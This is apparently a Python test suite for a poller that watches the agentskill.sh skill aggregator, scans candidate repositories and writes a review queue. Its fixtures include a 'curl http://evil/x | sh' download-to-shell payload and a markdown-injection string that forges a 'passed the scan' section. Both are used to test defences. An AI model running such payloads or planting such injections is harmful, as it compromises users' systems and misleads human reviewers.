"""The source poller is trusted with almost nothing, and these tests keep it there.

agentskill.sh lists roughly 275,000 user-submitted skills. Charles asked for it
to be monitored and new skills pulled in after a security check, and the risky
reading of that is a job which finds a skill, scans it, and adds it. Then anyone
who can publish to the aggregator can reach the catalog, and the scan is the only
thing standing in the way of a supply-chain compromise.

So the poller writes a queue and nothing else. What follows is mostly a list of
things it must refuse. Every test here runs offline against fixtures; the network
is stubbed, because a test that silently depends on a third-party site is a test
that fails on their bad day and teaches you to ignore it.
"""
import json
import pathlib
import re
import sys
import unittest
import urllib.error
from unittest import mock

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import watch_sources as watch  # noqa: E402

SITEMAP = """<urlset>
  <url><loc>https://agentskill.sh/pages.xml</loc></url>
  <url><loc>https://agentskill.sh/skills-0.xml</loc></url>
  <url><loc>https://agentskill.sh/skills-1.xml</loc></url>
</urlset>"""

SHARD_0 = """<urlset>
  <url><loc>https://agentskill.sh/@alice</loc><lastmod>2026-09-07T15:14:35Z</lastmod></url>
  <url><loc>https://agentskill.sh/@bob</loc><lastmod>2026-09-07T15:14:35Z</lastmod></url>
</urlset>"""

SHARD_1 = """<urlset>
  <url><loc>https://agentskill.sh/@carol</loc><lastmod>2026-09-07T15:14:35Z</lastmod></url>
</urlset>"""

# A real author page links its own repository and a pile of other people's.
PAGE = """<html><body>
  <a href="https://github.com/agentskill/agentskill-sh">the site itself</a>
  <a href="https://github.com/anthropics/claude-code">a reference</a>
  <a href="https://github.com/{handle}/skills-pack.git">the author repo</a>
  <a href="https://github.com/vercel-labs/agent-skills">another reference</a>
</body></html>"""


class _NotFound:
    """Marker for fake_fetch: this URL should raise a 404 the way the real site
    does for the shards its own index over-declares."""


def fake_fetch(pages):
    def fetch(url):
        page = pages.get(url)
        if isinstance(page, _NotFound):
            raise urllib.error.HTTPError(url, 404, "Not Found", None, None)
        if page is not None:
            return page
        raise OSError(f"unexpected fetch: {url}")
    return fetch


def default_pages():
    return {
        watch.SITEMAP: SITEMAP,
        "https://agentskill.sh/skills-0.xml": SHARD_0,
        "https://agentskill.sh/skills-1.xml": SHARD_1,
        "https://agentskill.sh/@alice": PAGE.format(handle="alice"),
        "https://agentskill.sh/@bob": PAGE.format(handle="bob"),
        "https://agentskill.sh/@carol": PAGE.format(handle="carol"),
    }


class PollingIsIncremental(unittest.TestCase):
    """The site publishes one lastmod for every entry, a site-wide regeneration
    stamp, so change has to be detected by diffing the handle set instead."""

    def setUp(self):
        self.tmp = pathlib.Path(
            __import__("tempfile").mkdtemp(prefix="watch-test-"))
        self.seen = self.tmp / "seen.txt"
        self.queue = self.tmp / "queue.json"
        patches = [
            mock.patch.object(watch, "SEEN", self.seen),
            mock.patch.object(watch, "QUEUE", self.queue),
            mock.patch.object(watch, "fetch", fake_fetch(default_pages())),
        ]
        for patch in patches:
            patch.start()
            self.addCleanup(patch.stop)

    def baseline_done(self, seen="zed"):
        """Put the poller past the baseline phase, which is where candidates
        actually start being resolved."""
        self.seen.write_text("# baseline\n" + seen + "\n", encoding="utf-8")
        self.queue.write_text(json.dumps(
            {"updated": None, "shard_cursor": 0, "baseline_done": True,
             "candidates": {}}), encoding="utf-8")

    def test_the_baseline_run_records_handles_without_fetching_any_page(self):
        """Two thousand existing handles are a backlog, not two thousand new
        skills. Resolving them on day one would be thousands of page fetches to
        learn that the site existed before this poller did."""
        with mock.patch.object(watch, "resolve_handle") as resolve:
            result = watch.poll(max_pages=25, verbose=False)
            resolve.assert_not_called()
        self.assertEqual(result["listed"], 3)
        self.assertEqual(result["queued"], 0)
        self.assertIn("baseline", " ".join(result["problems"]))
        self.assertEqual(len(watch.load_seen()), 3)

    def test_an_unbounded_sweep_finishes_the_baseline_in_one_run(self):
        watch.poll(max_pages=25, verbose=False)
        self.assertTrue(watch.load_queue()["baseline_done"])

    def test_a_bounded_sweep_keeps_building_the_baseline_and_saves_its_place(self):
        """A slice of the shards is not the whole listing, so declaring the
        baseline done after one slice would make the rest look like news for
        weeks."""
        result = watch.poll(max_pages=25, max_shards=1, verbose=False)
        queue = watch.load_queue()
        self.assertFalse(queue["baseline_done"])
        self.assertEqual(queue["shard_cursor"], 1)
        self.assertIn("building the baseline", " ".join(result["problems"]))

    def test_a_handle_seen_before_is_never_fetched_again(self):
        self.baseline_done(seen="alice\nbob")
        with mock.patch.object(watch, "resolve_handle",
                               wraps=watch.resolve_handle) as resolve:
            watch.poll(max_pages=25, verbose=False)
            fetched = [call.args[0] for call in resolve.call_args_list]
        self.assertEqual(fetched, ["carol"])

    def test_the_page_budget_is_respected(self):
        self.baseline_done()
        with mock.patch.object(watch, "resolve_handle",
                               wraps=watch.resolve_handle) as resolve:
            watch.poll(max_pages=2, verbose=False)
        self.assertEqual(resolve.call_count, 2)

    def test_handles_beyond_the_budget_stay_new_for_the_next_run(self):
        """Marking the whole listing seen after reading two pages would lose the
        rest of the backlog permanently."""
        self.baseline_done()
        watch.poll(max_pages=2, verbose=False)
        remaining = {"alice", "bob", "carol"} - watch.load_seen()
        self.assertEqual(len(remaining), 1)

    def test_an_unreachable_sitemap_marks_nothing_as_seen(self):
        """Otherwise a bad afternoon at the source silently burns the backlog."""
        self.baseline_done()
        before = watch.load_seen()
        with mock.patch.object(watch, "fetch", side_effect=OSError("boom")):
            result = watch.poll(max_pages=25, verbose=False)
        self.assertEqual(result["listed"], 0)
        self.assertTrue(result["problems"])
        self.assertEqual(watch.load_seen(), before)

    def test_a_failing_shard_is_reported_rather_than_swallowed(self):
        pages = default_pages()
        del pages["https://agentskill.sh/skills-1.xml"]
        with mock.patch.object(watch, "fetch", fake_fetch(pages)):
            _, problems, _, _ = watch.sitemap_handles()
        self.assertTrue(any("skills-1.xml" in p for p in problems))

    def test_a_bounded_sweep_says_which_shards_it_did_not_read(self):
        """A cap nobody is told about reads as complete coverage."""
        _, problems, cursor, total = watch.sitemap_handles(max_shards=1, cursor=0)
        self.assertEqual((cursor, total), (1, 2))
        self.assertTrue(any("resumes there" in p for p in problems))

    def test_the_cursor_wraps_rather_than_running_off_the_end(self):
        _, _, cursor, total = watch.sitemap_handles(max_shards=1, cursor=1)
        self.assertEqual((cursor, total), (0, 2))

    def test_absent_shards_are_summarised_once_not_reported_each(self):
        """Half the listed shards 404 on the real site. Two hundred and fifty
        identical lines would bury the failures that matter."""
        pages = default_pages()
        pages["https://agentskill.sh/skills-1.xml"] = _NotFound()
        with mock.patch.object(watch, "fetch", fake_fetch(pages)):
            _, problems, _, _ = watch.sitemap_handles()
        absent = [p for p in problems if "404" in p]
        self.assertEqual(len(absent), 1)
        self.assertIn("1 of the 2 shards", absent[0])


class ResolvingAListing(unittest.TestCase):
    def setUp(self):
        patch = mock.patch.object(watch, "fetch", fake_fetch(default_pages()))
        patch.start()
        self.addCleanup(patch.stop)

    def test_the_author_repository_wins_over_the_links_around_it(self):
        found = watch.resolve_handle("alice")
        self.assertEqual(found["slug"], "alice/skills-pack")

    def test_the_sites_own_repository_is_never_a_candidate(self):
        for handle in ("alice", "bob", "carol"):
            self.assertNotIn("agentskill", watch.resolve_handle(handle)["slug"])

    def test_a_page_with_no_repository_of_its_own_resolves_to_nothing(self):
        """A listing that resolves to nothing cannot be cloned or scanned, so
        queueing it would add an unactionable row every single week."""
        pages = default_pages()
        pages["https://agentskill.sh/@alice"] = "<html><body>no links</body></html>"
        with mock.patch.object(watch, "fetch", fake_fetch(pages)):
            self.assertIsNone(watch.resolve_handle("alice"))

    def test_a_dead_page_resolves_to_nothing_rather_than_raising(self):
        with mock.patch.object(watch, "fetch", side_effect=OSError("404")):
            self.assertIsNone(watch.resolve_handle("alice"))

    def test_the_git_suffix_is_stripped_so_slugs_match_the_catalog(self):
        self.assertNotIn(".git", watch.resolve_handle("bob")["slug"])


class WhatItRefusesToDo(unittest.TestCase):
    def setUp(self):
        self.body = (ROOT / "scripts" / "watch_sources.py").read_text(encoding="utf-8")

    def test_it_never_writes_into_repo_lists(self):
        """The catalog is the gate. install_catalog_skill.py refuses any slug that
        is not in a lane file, so a poller that could write one could install
        anything the aggregator served it."""
        for writer in ("write_text", "open(", "shutil.copy"):
            for line in self.body.splitlines():
                if writer in line and "repo-lists" in line and "SOURCES" not in line:
                    self.fail(f"writes into repo-lists: {line.strip()}")

    def test_it_only_reads_the_source_list(self):
        reads = [line for line in self.body.splitlines() if "SOURCES" in line]
        self.assertTrue(reads)
        for line in reads:
            self.assertNotIn("write_text", line)

    def test_it_clones_shallow_and_runs_nothing_from_the_clone(self):
        self.assertIn('"--depth", "1"', self.body)
        for runner in ("npm install", "pip install", "setup.py", "make ", "postinstall"):
            self.assertNotIn(runner, self.body, f"the clone is executed via {runner}")

    def test_the_clone_inherits_the_environment(self):
        # A PATH-only env loses SystemRoot on Windows and git then fails DNS with
        # "getaddrinfo() thread failed". That cost a debugging session once.
        self.assertIn("env=os.environ.copy()", self.body)

    def test_a_scanner_failure_is_never_recorded_as_clean(self):
        """Tested by behaviour, not by where the strings sit in the file. The
        text-position version of this passed for the wrong reason and then broke
        when a new early return was added above it."""
        self.assertIn("has_scanner_error", self.body)
        with mock.patch.object(watch.subprocess, "run"), \
             mock.patch.object(watch, "scan_tree_honestly",
                               return_value=["SCANNER-ERROR clamav has no database"]):
            verdict, _ = watch.scan_candidate("someone/pack")
        self.assertEqual(verdict, "inconclusive")

    def test_a_repository_with_no_findings_is_the_only_clean_path(self):
        with mock.patch.object(watch.subprocess, "run"), \
             mock.patch.object(watch, "scan_tree_honestly", return_value=[]):
            verdict, findings = watch.scan_candidate("someone/pack")
        self.assertEqual((verdict, findings), ("clean", []))

    def test_a_real_finding_blocks(self):
        with mock.patch.object(watch.subprocess, "run"), \
             mock.patch.object(watch, "scan_tree_honestly",
                               return_value=["HIGH download-to-shell in README.md"]):
            verdict, findings = watch.scan_candidate("someone/pack")
        self.assertEqual(verdict, "blocked")
        self.assertTrue(findings)

    def test_a_missing_repository_is_unreachable_not_clean(self):
        error = watch.subprocess.CalledProcessError(
            128, "git", stderr=b"remote: Repository not found.")
        with mock.patch.object(watch.subprocess, "run", side_effect=error):
            verdict, findings = watch.scan_candidate("someone/gone")
        self.assertEqual(verdict, "unreachable")
        self.assertIn("Repository not found", findings[0])

    def test_a_checkout_the_filesystem_refuses_is_inconclusive_not_unreachable(self):
        """Windows rejects a path with a trailing space, so the clone succeeds
        and the checkout does not. Calling that unreachable would be a lie about
        the repository; calling it clean would be a lie about the scan. Seen for
        real on AJBcoding/claude-skill-eval, 2026-09-07."""
        error = watch.subprocess.CalledProcessError(
            128, "git",
            stderr=b"error: invalid path 'Archive /BAD.md'\nfatal: unable to "
                   b"checkout working tree")
        with mock.patch.object(watch.subprocess, "run", side_effect=error):
            verdict, findings = watch.scan_candidate("someone/awkward")
        self.assertEqual(verdict, "inconclusive")
        self.assertIn("could not be checked out", findings[0])

    def test_it_does_not_trust_the_sources_own_security_score(self):
        self.assertIn("signal", self.body)
        self.assertIn("catalog_security", self.body)

    def test_no_em_or_en_dashes(self):
        self.assertNotIn("—", self.body)
        self.assertNotIn("–", self.body)


class TheQueueAndTheReport(unittest.TestCase):
    def setUp(self):
        self.tmp = pathlib.Path(__import__("tempfile").mkdtemp(prefix="watch-report-"))
        self.queue = self.tmp / "queue.json"
        patch = mock.patch.object(watch, "QUEUE", self.queue)
        patch.start()
        self.addCleanup(patch.stop)
        self.queue.write_text(json.dumps({
            "updated": "2026-09-07T00:00:00Z",
            "candidates": {
                "alice/skills-pack": {"handle": "alice", "source": "https://agentskill.sh/@alice",
                                      "found": "2026-09-07", "security": "clean", "findings": []},
                "bob/evil": {"handle": "bob", "source": "https://agentskill.sh/@bob",
                             "found": "2026-09-07", "security": "blocked",
                             "findings": ["INVISIBLE-CHARS skill.md:3"]},
                "carol/new": {"handle": "carol", "source": "https://agentskill.sh/@carol",
                              "found": "2026-09-07", "security": "unscanned", "findings": []},
            }}), encoding="utf-8")

    def test_blocked_candidates_are_reported_before_clean_ones(self):
        body = watch.report()
        self.assertLess(body.index("Blocked by the scan"),
                        body.index("Passed the scan"))

    def test_a_clean_scan_is_not_presented_as_an_endorsement(self):
        self.assertIn("A clean scan is not an endorsement", watch.report())

    def test_the_report_says_adoption_is_still_a_manual_step(self):
        body = watch.report()
        self.assertIn("repo-lists/", body)
        self.assertIn("install_catalog_skill.py", body)

    def test_a_blocked_finding_appears_in_the_report(self):
        self.assertIn("INVISIBLE-CHARS", watch.report())

    def test_the_watched_sources_are_listed_so_the_reader_knows_the_inputs(self):
        self.assertIn("agentskill.sh", watch.report())


class TheSourceListItself(unittest.TestCase):
    def test_agentskill_is_a_declared_source(self):
        urls = [s["url"] for s in watch.read_sources()]
        self.assertTrue(any("agentskill.sh" in url for url in urls),
                        "the source Charles named is not in watch-sources.txt")

    def test_every_declared_source_carries_a_note(self):
        """A source nobody can explain is a source nobody should be polling."""
        for source in watch.read_sources():
            self.assertTrue(source["note"], f"{source['url']} has no note")

    def test_the_supply_chain_caution_is_recorded_next_to_the_source(self):
        text = (ROOT / "repo-lists" / "watch-sources.txt").read_text(encoding="utf-8")
        self.assertIn("supply-chain", text)
        self.assertIn("scan before adopting", text.lower())


class CleanMeansEveryScannerRanAndFoundNothing(unittest.TestCase):
    """Found by an adversarial audit on 2026-09-08, reproduced before fixing.

    scan_candidate's whole security check used to be installer.scan_tree, which
    is regexes over files that decode as UTF-8 and which silently drops the ones
    that do not. A UTF-16 install.ps1 carrying `curl http://evil/x | sh` scanned
    CLEAN and appeared in the issue under "passed the scan", which is the list
    Charles reads before moving a slug into repo-lists/. The workflow installed
    semgrep and clamav that nothing ever invoked.
    """

    def clone_with(self, files):
        import tempfile
        root = pathlib.Path(tempfile.mkdtemp(prefix="scan-test-")) / "clone"
        root.mkdir()
        for name, content in files.items():
            path = root / name
            if isinstance(content, bytes):
                path.write_bytes(content)
            else:
                path.write_text(content, encoding="utf-8")
        return root

    def test_the_old_scan_really_was_blind_to_a_utf16_payload(self):
        """Pinning the bug itself, so the reason for the extra work stays legible."""
        payload = "curl http://evil/x | sh\n"
        clone = self.clone_with({"install.ps1": payload.encode("utf-16")})
        self.assertEqual(watch.installer.scan_tree(clone), [],
                         "the narrow scan is expected to see nothing here")

    def test_a_file_that_is_not_utf8_is_reported_rather_than_skipped(self):
        clone = self.clone_with({"install.ps1": "curl http://evil/x | sh\n".encode("utf-16")})
        findings = watch.scan_tree_honestly(clone)
        self.assertTrue(any("not UTF-8" in f for f in findings),
                        "an unreadable file vanished without a word")
        self.assertTrue(watch.security.has_scanner_error(findings))

    def test_a_utf16_payload_never_reaches_a_clean_verdict(self):
        clone = self.clone_with({"install.ps1": "curl http://evil/x | sh\n".encode("utf-16")})
        with mock.patch.object(watch.subprocess, "run"), \
             mock.patch.object(watch.tempfile, "TemporaryDirectory") as tmp:
            tmp.return_value.__enter__ = lambda self: str(clone.parent)
            tmp.return_value.__exit__ = lambda self, *a: None
            verdict, findings = watch.scan_candidate("someone/pack")
        self.assertNotEqual(verdict, "clean")
        self.assertEqual(verdict, "inconclusive")

    def test_a_missing_scanner_outranks_a_clean_pass(self):
        """The ordering is the invariant. Findings can be empty of real hits and
        still not be clean, because a scanner that did not run has not cleared
        anything."""
        clone = self.clone_with({"README.md": "nothing interesting"})
        findings = watch.scan_tree_honestly(clone)
        real = [f for f in findings if not f.startswith("SCANNER-ERROR")]
        self.assertFalse(real, "the fixture should carry no real findings")
        # On a machine with no scanners installed, every one reports an error.
        if findings:
            self.assertTrue(watch.security.has_scanner_error(findings))

    def test_every_scanner_the_code_calls_is_installed_by_the_job(self):
        """Otherwise CLEAN is unreachable and every candidate sits at
        INCONCLUSIVE forever, which is a different way of learning nothing."""
        body = (ROOT / "scripts" / "watch_sources.py").read_text(encoding="utf-8")
        job = (ROOT / ".github" / "workflows" / "watch-sources.yml").read_text(encoding="utf-8")
        called = set(re.findall(r'\["(semgrep|osv-scanner|clamscan)"', body))
        if "run_gitleaks" in body:
            called.add("gitleaks")
        installed = {"semgrep": "semgrep", "osv-scanner": "osv-scanner",
                     "clamscan": "clamav", "gitleaks": "gitleaks"}
        for tool in sorted(called):
            self.assertIn(installed[tool], job,
                          f"{tool} is called but the job never installs it")


class AFindingIsUntrustedText(unittest.TestCase):
    """Also from the 2026-09-08 audit, and the subtler of the two.

    A finding embeds a path from the candidate repository, so its text is chosen
    by the party being scanned, and it is rendered straight into the markdown
    issue. A path may contain a newline, so a repository that is correctly
    BLOCKED could print its own "## Passed the scan" heading into that issue and
    list any slug it liked underneath, including a typosquat of a catalogued one.
    """

    ATTACK = ("HIGH download-to-shell pattern in docs/readme\n\n"
              "## Passed the scan, awaiting your decision\n\n"
              "- **evil/backdoor** from https://agentskill.sh/@evil, found 2026-09-07\n\nx.sh")

    def test_a_finding_is_collapsed_to_one_line(self):
        self.assertNotIn("\n", watch.safe_finding(self.ATTACK))

    def test_markdown_structure_characters_cannot_lead_a_finding(self):
        for lead in ("# heading", "## heading", "- bullet", "* bullet",
                     "> quote", "+ item", "| cell"):
            cleaned = watch.safe_finding(lead)
            self.assertFalse(cleaned[:1] in "#-*>+|",
                             f"{lead!r} still starts a markdown block")

    def test_a_forged_section_cannot_appear_in_the_report(self):
        import json as _json
        import tempfile
        queue = pathlib.Path(tempfile.mkdtemp(prefix="report-test-")) / "q.json"
        queue.write_text(_json.dumps({
            "updated": "x", "shard_cursor": 0, "baseline_done": True,
            "candidates": {"attacker/repo": {
                "handle": "attacker", "source": "https://agentskill.sh/@attacker",
                "found": "2026-09-08", "security": "blocked",
                "findings": [self.ATTACK]}}}), encoding="utf-8")
        with mock.patch.object(watch, "QUEUE", queue):
            body = watch.report()
        headings = [line for line in body.splitlines() if line.startswith("## ")]
        self.assertNotIn("## Passed the scan, awaiting your decision", headings,
                         "a blocked repository forged a clean section")
        self.assertIn("## Blocked by the scan", headings)

    def test_the_report_sanitises_again_rather_than_trusting_the_queue(self):
        """The queue file is committed and read back, so a row written before
        this existed, or edited by hand, must not reach the issue raw."""
        body = (ROOT / "scripts" / "watch_sources.py").read_text(encoding="utf-8")
        render = body[body.index("def report()"):]
        self.assertIn("safe_finding(finding)", render)

    def test_an_empty_finding_does_not_render_as_a_blank_bullet(self):
        self.assertEqual(watch.safe_finding(""), "(empty finding)")

    def test_a_very_long_finding_is_capped_and_says_so(self):
        cleaned = watch.safe_finding("a" * 5000)
        self.assertLess(len(cleaned), 400)
        self.assertTrue(cleaned.endswith("[truncated]"))

    def test_findings_are_sanitised_before_they_are_persisted(self):
        """Not only at render. The queue is committed to the repository, so the
        raw bytes should never land there in the first place."""
        body = (ROOT / "scripts" / "watch_sources.py").read_text(encoding="utf-8")
        scan = body[body.index("def scan_candidate("):body.index("def scan(")]
        self.assertIn("safe_finding(f) for f in findings", scan)


class ThePollerCannotQuietlyStop(unittest.TestCase):
    """Monitoring that can be deleted without a word is monitoring that stops,
    and the failure mode is silence rather than an error. Both guards cover the
    poller and its job for the same reason they cover the pipeline hook."""

    def guard(self, script, command):
        event = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
        import subprocess
        return subprocess.run(
            [sys.executable, str(ROOT / "scripts" / "hooks" / script)],
            input=event.encode("utf-8"), capture_output=True).returncode

    def test_deleting_the_poller_is_blocked(self):
        self.assertEqual(self.guard("no_prune_guard.py", "rm scripts/watch_sources.py"), 2)

    def test_deleting_the_job_that_runs_it_is_blocked(self):
        self.assertEqual(
            self.guard("no_prune_guard.py", "rm .github/workflows/watch-sources.yml"), 2)

    def test_reading_it_is_not_blocked(self):
        """A protection that stops the thing being used is not a protection."""
        self.assertEqual(self.guard("no_prune_guard.py", "cat scripts/watch_sources.py"), 0)

    def test_running_it_is_not_blocked(self):
        self.assertEqual(
            self.guard("no_prune_guard.py", "python scripts/watch_sources.py --poll"), 0)

    def test_compressing_it_is_blocked(self):
        self.assertEqual(
            self.guard("no_compress_guard.py",
                       "python -c \"open('scripts/watch_sources.py','w').write('')\""), 2)


class TheWorkflow(unittest.TestCase):
    def setUp(self):
        self.body = (ROOT / ".github" / "workflows" / "watch-sources.yml").read_text(
            encoding="utf-8")

    def test_it_runs_on_a_schedule(self):
        self.assertIn("schedule:", self.body)
        self.assertIn("cron:", self.body)

    def test_it_does_not_collide_with_the_guardian_run(self):
        guardian = (ROOT / ".github" / "workflows" / "catalog-guardian.yml").read_text(
            encoding="utf-8")
        mine = [line for line in self.body.splitlines() if "cron:" in line]
        theirs = [line for line in guardian.splitlines() if "cron:" in line]
        for line in mine:
            self.assertNotIn(line.strip(), [t.strip() for t in theirs],
                             "two catalog issues would land on the same morning")

    def test_it_commits_only_the_two_generated_files(self):
        adds = [line.strip() for line in self.body.splitlines()
                if line.strip().startswith("git add")]
        self.assertEqual(len(adds), 1)
        self.assertEqual(adds[0],
                         "git add docs/watch-sources-seen.txt docs/watch-candidates.json")

    def test_it_commits_as_charles_and_signs_as_nobody_else(self):
        self.assertIn("charlesganu2004@gmail.com", self.body)
        for banned in ("Co-Authored-By", "noreply@anthropic", "Generated with"):
            self.assertNotIn(banned, self.body)

    def test_it_starts_read_only(self):
        first = self.body.index("permissions:")
        self.assertIn("contents: read", self.body[first:first + 60])

    def test_a_scanner_that_fails_to_install_does_not_fail_the_run(self):
        self.assertIn("::warning::", self.body)
        self.assertIn("SCANNER-ERROR", self.body)


if __name__ == "__main__":
    unittest.main()
